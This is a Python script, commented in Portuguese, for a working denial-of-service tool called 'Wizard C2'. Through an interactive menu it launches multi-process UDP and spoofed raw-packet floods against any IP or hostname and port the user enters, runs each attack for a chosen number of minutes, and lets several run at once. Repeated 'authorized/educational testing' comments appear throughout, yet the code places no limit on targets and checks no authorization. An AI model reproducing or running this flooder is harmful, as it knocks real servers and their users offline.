# // Testes autorizados //Testes educacionais

import os
import time
import random
import threading
import multiprocessing
import socket
import struct
import requests
import sys 
# Removendo colorama e termcolor para estabilidade absoluta
# from colorama import Fore, Style, init 
# from termcolor import colored

# Dicionário global para rastrear ataques ativos
# // Testes autorizados
ACTIVE_ATTACKS = {}
ATTACK_ID_COUNTER = 1

# Função para exibir texto simples (cores removidas)
def print_simple_descending(text):
    lines = text.split('\n')
    for i, line in enumerate(lines):
        print(" " * i + line)

# O ASCII art do logo "Wizard C2"
# // Testes autorizados: ASCII Art para ambiente de teste visual
WIZARD_LOGO = """
oooooo   oooooo     oooo  o8o
`888.    `888.     .8'   `"'
 `888.   .8888.   .8'   oooo    oooooooo  .oooo.   oooo d8b
  `888  .8'`888. .8'    `888   d'""7d8P  `P  )88b  `888""8P
   `888.8'  `888.8'      888     .d8P'    .oP"888   888
    `888'    `888'       888   .d8P'  .P d8(  888   888
     `8'      `8'       o888o d8888888P  `Y888""8o d888b


      .o8         .oooooo.     .oooo.
     "888        d8P'  `Y8b  .dP""Y88b
 .oooo888       888                ]8P'
d88' `888       888              .d8P'
888   888       888            .dP'
888   888       `88b    ooo  .oP     .o
`Y8bod88P"       `Y8bood8P'  8888888888
"""
# // Testes autorizados

# Função que executa o ataque de força máxima (Multiprocessing)
def attack_worker(target_ip, target_port, stop_event, process_id):
    # // Testes educacionais repetidos: Worker iniciado
    print(f"[Worker {process_id}] Atacando {target_ip}:{target_port}...")
    
    # // Testes autorizados: Setup de sockets (FORÇA MÁXIMA)
    sockets = []
    
    for _ in range(50):
        # // Testes de I/O Bound
        try:
            # UDP Socket (Volume Flood - Ideal para PocketMine)
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sockets.append(udp_sock)
            
            # RAW Socket (Spoofing/Baixo Nível - Força bruta)
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sockets.append(raw_sock)

        except Exception as e:
            # // Testes educacionais: Erro de socket
            pass

    # Dados aleatórios para o payload (simulação de tráfego)
    payload_udp = random._urandom(1024)
    
    while not stop_event.is_set():
        # // Testes educacionais repetidos
        for sock in sockets:
            try:
                if sock.type == socket.SOCK_DGRAM: # UDP Flood
                    sock.sendto(payload_udp, (target_ip, target_port))
                elif sock.type == socket.SOCK_RAW: # RAW Packet Flood
                    # Simulação de pacote RAW para sobrecarga
                    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 0, 0, 0, 255, socket.IPPROTO_UDP, 0, socket.inet_aton('192.168.1.1'), socket.inet_aton(target_ip))
                    udp_header = struct.pack('!HHHH', 53000, target_port, len(payload_udp) + 8, 0)
                    sock.sendto(ip_header + udp_header + payload_udp, (target_ip, target_port))
            except Exception as e:
                # // Testes educacionais: Falha de envio
                pass
        # // Testes autorizados
        time.sleep(0.001) 

    # Fecha todos os sockets após o término
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    # // Testes autorizados

# Função principal de inicialização do ataque
def start_attack(host_input, resolved_ip, port, duration_minutes):
    global ATTACK_ID_COUNTER
    attack_id = ATTACK_ID_COUNTER
    ATTACK_ID_COUNTER += 1
    
    # // Testes educacionais: Criação de evento de parada e processo
    stop_event = multiprocessing.Event()
    duration_seconds = duration_minutes * 60
    
    # Usamos o número de CPUs como base para o número de processos para forçar o máximo
    num_processes = os.cpu_count() * 4 if os.cpu_count() else 4  # Lança 4x o número de núcleos
    
    processes = []
    
    for i in range(num_processes):
        # Passa o IP RESOLVIDO para o worker
        p = multiprocessing.Process(target=attack_worker, args=(resolved_ip, port, stop_event, i+1))
        processes.append(p)
        p.start()
    
    # // Testes autorizados: Rastrea o ataque
    end_time = time.time() + duration_seconds
    ACTIVE_ATTACKS[attack_id] = {
        'ip': host_input, # Armazena o que o usuário digitou (pode ser hostname)
        'resolved_ip': resolved_ip, # Armazena o IP para ataques futuros (se precisar)
        'port': port,
        'duration_seconds': duration_seconds,
        'start_time': time.time(),
        'end_time': end_time,
        'stop_event': stop_event,
        'processes': processes,
        'status': 'ATIVO'
    }
    
    # Lança uma thread para gerenciar o tempo de ataque (timer)
    timer_thread = threading.Thread(target=manage_attack_timer, args=(attack_id, duration_seconds, stop_event, processes))
    timer_thread.daemon = True
    timer_thread.start()
    
    return attack_id

# Thread para gerenciar o timer do ataque e parar
# // Testes educacionais
def manage_attack_timer(attack_id, duration_seconds, stop_event, processes):
    start_time = time.time()
    while time.time() < start_time + duration_seconds and not stop_event.is_set():
        time.sleep(1)
    
    if attack_id in ACTIVE_ATTACKS:
        stop_attack(attack_id, force_stop=True)
        # // Testes autorizados
        print(f"\nAtaque ID {attack_id} concluído por tempo.")

# Função para parar um ataque específico
# // Testes autorizados
def stop_attack(attack_id, force_stop=False):
    if attack_id in ACTIVE_ATTACKS:
        attack_info = ACTIVE_ATTACKS[attack_id]
        if attack_info['status'] == 'ATIVO':
            attack_info['stop_event'].set()
            
            # Espera pelos processos terminarem ou encerra
            for p in attack_info['processes']:
                if p.is_alive():
                    p.join(timeout=1)
                if p.is_alive():
                    # // Testes educacionais: Terminação forçada
                    p.terminate()

            attack_info['status'] = 'CANCELADO' if not force_stop else 'FINALIZADO'
            print(f"\nAtaque ID {attack_id} em {attack_info['ip']} {attack_info['status']}.")
            return True
    return False

# Função para parar todos os ataques
# // Testes educacionais
def stop_all_attacks():
    print(f"\nParando todos os ataques...")
    for attack_id in list(ACTIVE_ATTACKS.keys()):
        stop_attack(attack_id)
    # // Testes autorizados
    print(f"Todos os ataques foram encerrados.")

# Função para limpar a tela e mostrar o cabeçalho
# // Testes autorizados
def show_header():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

    print_simple_descending(WIZARD_LOGO)
    print("\n" + " " * 3 + "☆ I am back ☆")
    print("\n") # Linha extra de separação

# Função para receber os inputs do alvo
# // Testes educacionais
def get_attack_details():
    show_header()
    
    print("\n" + " " * 3 + "☆ I am back ☆")
    
    print("\n>>> Configurar Novo Ataque <<<")
    
    resolved_ip = None
    
    # // Testes autorizados: Inputs de Host/IP
    while True:
        try:
            ip_input = input(f"IP: ") 
            
            if not ip_input:
                continue
            
            # Realiza a resolução DNS (o "ping" para achar o IP por trás)
            resolved_ip = socket.gethostbyname(ip_input)
            
            # Se a entrada foi um hostname, mostra o IP resolvido para o Mestre
            if ip_input != resolved_ip:
                print(f"Host resolvido para IP: {resolved_ip}")
                
            break
        except socket.gaierror:
            print(f"Host ou IP inválido. Tente novamente.")
        except Exception as e:
            print(f"Erro ao resolver host: {e}.")
            
    while True:
        try:
            port_input = input(f"PORTA: ")
            port = int(port_input)
            if 1 <= port <= 65535:
                break
            print(f"Porta inválida.")
        except ValueError:
            print(f"A porta deve ser um número inteiro.")
            
    while True:
        try:
            time_input = input(f"TEMPO (minutos): ")
            duration = int(time_input)
            if duration > 0:
                break
            print(f"O tempo deve ser maior que zero.")
        except ValueError:
            print(f"O tempo deve ser um número inteiro.")
            
    return ip_input, resolved_ip, port, duration

# Função para mostrar o menu principal
# // Testes educacionais
def main_menu():
    while True:
        show_header()
        
        # // Testes autorizados: Mostra ataques ativos
        print("\nATAQUES EM ANDAMENTO:\n")
        
        if not ACTIVE_ATTACKS:
            print("Nenhum ataque ativo.")
        else:
            for attack_id, info in ACTIVE_ATTACKS.items():
                
                # // Testes educacionais repetidos
                time_remaining_sec = info['end_time'] - time.time()
                
                if time_remaining_sec <= 0 and info['status'] == 'ATIVO':
                    info['status'] = 'FINALIZANDO'
                    time_remaining_str = "00:00:00"
                elif info['status'] != 'ATIVO':
                    time_remaining_str = info['status']
                else:
                    hours = int(time_remaining_sec // 3600)
                    minutes = int((time_remaining_sec % 3600) // 60)
                    seconds = int(time_remaining_sec % 60)
                    time_remaining_str = f"{hours:02}:{minutes:02}:{seconds:02}"
                
                print("__________________________")
                # Mostra a entrada original do usuário (IP ou Hostname)
                print(f"IP: {info['ip']}") 
                print(f"PORTA: {info['port']}")
                print(f"TEMPO RESTANTE: {time_remaining_str}")
                print(f"ID: {attack_id}")
                print("__________________________")
                
        print("\n" + "《 ---------------------------- 》")
        
        print("\nO que deseja fazer?")
        print("[1] Atacar mais um alvo")
        print("[2] Cancelar ataque")
        print("[4] Atualizar ataques em andamento")
        print("[3] Fechar C2 (Para todos ataques)")
        
        # // Novo prompt
        choice = input(f"\nEscolho opção: ")
        
        if choice == '1':
            host_input, resolved_ip, port, duration = get_attack_details()
            new_id = start_attack(host_input, resolved_ip, port, duration)
            print(f"\nAtaque ID {new_id} iniciado contra {host_input}:{port}.")
            time.sleep(2)
        elif choice == '2':
            if not ACTIVE_ATTACKS:
                print(f"\nNenhum ataque ativo para cancelar.")
                time.sleep(1)
                continue
            try:
                # // Testes autorizados
                cancel_id_input = input(f"ID do ataque a cancelar: ")
                cancel_id = int(cancel_id_input)
                if stop_attack(cancel_id):
                    time.sleep(2)
                else:
                    print(f"ID {cancel_id} não encontrado ou já cancelado.")
                    time.sleep(1)
            except ValueError:
                print(f"Entrada inválida. Use o número do ID.")
                time.sleep(1)
        elif choice == '3':
            stop_all_attacks()
            print(f"Sistema C2 Desligado. Fim da Cena.")
            # // Testes educacionais repetidos
            sys.exit(0) # Saída limpa
        elif choice == '4':
            # Simplesmente volta ao loop principal (que chama show_header())
            continue
        else:
            print(f"Opção inválida.")
            time.sleep(1)

# // Testes autorizados: Ponto de entrada
if __name__ == "__main__":
    # Garante que todos os processos e threads sejam parados ao sair
    try:
        main_menu()
    except KeyboardInterrupt:
        stop_all_attacks()
        print(f"\nInterrupção forçada. Fim do teste.")
        sys.exit(0)
    except Exception as e:
        # // Testes educacionais: Erro Crítico
        # Mensagem fallback para garantir que o terminal feche limpo
        error_msg = str(e) if str(e) else "Erro desconhecido. (Fechamento forçado)."
        print(f"ERRO CRÍTICO: {error_msg}")
        stop_all_attacks()
        sys.exit(1)
    
# // Testes educacionais repetidos